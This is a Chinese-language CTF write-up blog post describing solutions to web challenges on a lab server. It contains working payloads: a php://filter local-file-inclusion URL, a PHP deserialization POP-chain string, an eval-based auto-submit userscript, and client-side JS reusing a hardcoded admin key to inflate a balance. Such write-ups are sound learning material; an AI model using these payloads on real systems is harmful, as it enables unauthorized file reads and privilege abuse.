---
title: CTF 随记
date: 2019-09-28
tags: CTF
category: 逆向
---

随手记录一下（

### 5呢

![](./Screenshot_20190928_194424.png)

### 简单的正则

通过构造符合题意的正则表达式即可得到 flag。

![](./Screenshot_20190928_194906.png)

http://10.60.38.227:34003/?s=the%20flag12/d/31

### 你会那样读文件吗

进入后链接提示我们跳转到 http://10.60.38.227:34007/index.php?file=hint.php ，之后在源码中找到提示：

![](./Screenshot_20190928_195107.png)

然后通过 php 伪协议获得 flag.php 的 base64，再通过解码就能拿到 flag了：

http://10.60.38.227:34007/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php

![](./Screenshot_20190928_195611.png)

### 快速计算

标题虽然说是 Python 计算，但其实并用不到 Python（

通过观察我们知道我们需要计算的内容是第二个 `div` 里的算式去掉 `=?` 的部分，于是简单写一个油猴脚本：

```js
// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://10.60.38.227:34005/
// @grant        none
// ==/UserScript==

(function() {
    const t = document.querySelectorAll('div')[1].textContent;
    const ev = t.substr(0, t.length - 2);
    const result = eval(ev);
    document.querySelector('input[type=text]').value = result;
    document.querySelector('input[type=Submit]').click();
})();
```

加载后刷新页面即可：

![](./Screenshot_20190928_195856.png)

### 哪个才是 flag

找不同，在源码中找到真正的 flag：

![](./Screenshot_20190928_200012.png)

### Serialize & Unserialize

首先先根据题目要求构造字符串：

```php
<?php
$KEY="Spirit";
echo serialize($KEY);
?>
```

得到第一步答案：`s:6:"Spirit";`，根据提示跳转到 `info.php`：

```php
<?php
@error_reporting(0);
class Start
{
    public $a;
    public $b;
    public function __destruct()
    {
        $this->a->test1();
    }
}
class Func1
{
    public $a;
    public $b;
    public function __call($test, $arr)
    {
        $this->b="字符串".$this->a;
    }
}
class Func2
{
    public $a;
    public $b;
    public function __toString()
    {
        $s=$this->a;
        $s();
        return "1";
    }
}
class Func3
{
    public $a;
    public $b;
    public function __invoke()
    {
        $this->a->get_flag();
    }
}
class Flag
{
    public function get_flag()
    {
        echo "flag{****************}";
    }
}
$a=isset($_GET['go'])?$_GET['go']:"";
$b=@unserialize($a);
if ($a&&!$b) {
    echo "unserilize('".$a ."')  失败";
}
```

根据观察，可以发现类从上到下类似链式调用，于是补充代码如下：

![](./Screenshot_20190928_112954.png)

得到输出结果：

> O:5:"Start":2:{s:1:"a";O:5:"Func1":2:{s:1:"a";O:5:"Func2":2:{s:1:"a";O:5:"Func3":2:{s:1:"a";O:4:"Flag":0:{}s:1:"b";N;}s:1:"b";N;}s:1:"b";N;}s:1:"b";N;}flag{****************}

![](./Screenshot_20190928_200807.png)

### log

首先观察 access.log 文件本身，我们可以发现其中充斥这很多 URI 编码后的字符串。我们先将其过一遍 `decodeURIComponent`，再去除一些无用的内容，诸如 `UserAgent`。

再观察，可以发现这是一次 SQL 注入的攻击日志，攻击者通过各位比较确认了 flag。于是我们可以利用攻击者确认 flag 的日志获得 flag。搜索 `!=`：

![](./Screenshot_20190928_201246.png)

可以看到，这些数字已经是我们想要的 `f`，`l`，`a`了。最后将其拼接起来即可：

![](./photo_2019-09-28_13-44-31.jpg)

### 可靠的WebApp

通过观察可以发现核心在于 `main.min.js`：

![](./Screenshot_20190928_201501.png)

打开文件，发现文件经过了混淆。我们使用 `JSNice` 简单对内容进行反混淆：

![](./Screenshot_20190928_201700.png)

再对所有用到 `_0x76ef` 的项进行整理，最后得到相对反混淆后的结果。在这个过程中，我们观察到这个对象：

```js
this.APIModels = {
  authorize: {
    model: "authorize"
  },
  userInfo: {
    model: "userInfo"
  },
  buyFlag: {
    model: "buyFlag"
  },
  adminAddCoin: {
    model: "adminAddCoin",
    key: "Admin123321.",
    count: 0
  }
};
```

通过这个对象，我们构建出增加余额的函数（上文对象中 `count` 需要改大）：

```js
this.adminAddCoin = function() {
  this.call("adminAddCoin", this.APIModels.adminAddCoin, function(
    canCreateDiscussions
  ) {
    console.log(canCreateDiscussions);
  });
};
```

最后，用我们修改完的 main 函数在 Console 中替换原有的 console 即可：

![](./Screenshot_20190928_202310.png)

![](./Screenshot_20190928_202341.png)


最后修改后的 `main.min.js` 如下：

```js
"use strict";

function main(key) {
  function GUIPARAMS() {
    let _this = this;
    this.token = null;

    this.onerror = function() {
      alert("Error on request.");
    };

    this.toCharArr = function(str) {
      str = str.split("");
      let arr = new Uint8Array(str.length);
      str.forEach(function(canCreateDiscussions, wikiId) {
        arr[wikiId] = canCreateDiscussions.charCodeAt(0);
      });
      return arr;
    };

    this.fromCharArr = function(canCreateDiscussions) {
      let plan_count = "";
      canCreateDiscussions.forEach(function(year_data) {
        plan_count = plan_count + String.fromCharCode(year_data);
      });
      return plan_count;
    };

    this.pkcs7Pad = function(msg) {
      let val = 16 - (msg.length % 16);
      let log = new Uint8Array(msg.length + val);
      log.set(msg, 0);
      log.fill(val, msg.length, msg.length + val);
      return log;
    };

    this.pkcs7UnPad = function(range) {
      let start = range[range.length - 1];
      if (start > 16) {
        return null;
      }
      return range.subarray(0, range.length - start);
    };

    this.ui8concat = function(sumX, data) {
      let command_codes = new Uint8Array(sumX.length + data.length);
      command_codes.set(sumX, 0);
      command_codes.set(data, sumX.length);
      return command_codes;
    };

    this.APIModels = {
      authorize: {
        model: "authorize"
      },
      userInfo: {
        model: "userInfo"
      },
      buyFlag: {
        model: "buyFlag"
      },
      adminAddCoin: {
        model: "adminAddCoin",
        key: "Admin123321.",
        count: 114514
      }
    };

    this.call = function(path, model, savetoBd) {
      this.iv = this.toCharArr(
        CryptoJS.MD5(
          Math.random()
            .toString(36)
            .substr(2)
        )
          .toString()
          .substr(0, 16)
      );
      let _0xe48ex10 = new aesjs.ModeOfOperation.cbc(this.key, this.iv);
      let value = this.ui8concat(
        this.iv,
        _0xe48ex10.encrypt(this.pkcs7Pad(this.toCharArr(JSON.stringify(model))))
      );
      let param = new XMLHttpRequest();

      param.timeout = 3000;
      param.open("POST", "/api/" + path, true);
      param.setRequestHeader("Content-type", "application/octet-stream");
      if (this.token) {
        param.setRequestHeader("X-Token", this.token);
        param.setRequestHeader(
          "X-Message-Code",
          CryptoJS.HmacSHA1(this.token, JSON.stringify(model))
        );
      }

      param.onload = function(canCreateDiscussions) {
        if (this.status === 200) {
          let data = JSON.parse(this.responseText);
          if (data.status === 0) {
            let rua = new aesjs.ModeOfOperation.cbc(_this.key, _this.iv);
            data.payload = JSON.parse(
              _this.fromCharArr(
                _this.pkcs7UnPad(
                  rua.decrypt(_this.toCharArr(window.atob(data.payload)))
                )
              )
            );
            savetoBd(data);
            return;
          }
        }
        _this.onerror();
      };
      param.ontimeout = this.onerror;
      param.onerror = this.onerror;
      param.send(value);
    };

    this.getUserInfo = function() {
      this.call("userInfo", this.APIModels.userInfo, function(
        canCreateDiscussions
      ) {
        console.log(canCreateDiscussions);
        document.getElementById("output").innerText =
          "You have " +
          canCreateDiscussions.payload.coin +
          " coins in your account.";
      });
    };

    this.buyFlag = function() {
      this.call("buyFlag", this.APIModels.buyFlag, function(
        canCreateDiscussions
      ) {
        console.log(canCreateDiscussions);
        let output = document.getElementById("output");
        if (canCreateDiscussions.payload.success) {
          output.innerText = canCreateDiscussions.payload.flag;
        } else {
          output.innerText = canCreateDiscussions.payload.reason;
        }
      });
    };

    this.authorize = function() {
      if (key) {
        this.key = this.toCharArr(key);
      } else {
        return;
      }
      this.call("authorize", this.APIModels.authorize, function(
        canCreateDiscussions
      ) {
        console.log(canCreateDiscussions);
        _this.token = canCreateDiscussions.payload.token;
        let packByNumType = document.getElementById("buttons");
        packByNumType.innerHTML = "";
        let data = document.createElement("button");
        data.innerHTML = "User Info";
        data.addEventListener("click", function() {
          _this.getUserInfo();
        });
        packByNumType.append(data);
        let pivot = document.createElement("button");
        pivot.innerHTML = "Buy Flag";
        pivot.addEventListener("click", function() {
          _this.buyFlag();
        });
        packByNumType.append(pivot);
      });
    };

    this.adminAddCoin = function() {
      this.call("adminAddCoin", this.APIModels.adminAddCoin, function(
        canCreateDiscussions
      ) {
        console.log(canCreateDiscussions);
      });
    };
  }
  let instance = new GUIPARAMS();
  instance.authorize();
  window.instance = instance;
}
```